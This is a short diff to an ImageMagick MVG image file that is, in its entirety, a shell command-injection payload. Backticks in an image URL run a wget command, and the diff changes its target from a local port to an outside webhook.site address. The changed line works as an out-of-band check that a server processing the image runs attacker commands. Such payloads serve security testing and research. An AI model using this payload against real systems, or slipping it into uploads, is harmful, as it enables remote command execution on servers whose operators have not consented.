@@ -1,4 +1,4 @@
 push graphic-context
 viewbox 0 0 640 480
-image over 0,0 0,0 'https://127.0.0.1/x.php?x=`wget -O- 127.0.0.1:1337 > /dev/null`'
+image over 0,0 0,0 'https://127.0.0.1/x.php?x=`wget -O- https://webhook.site/a27d57cf-df90-4a13-a5dc-987b283c51bf > /dev/null`'
 pop graphic-context
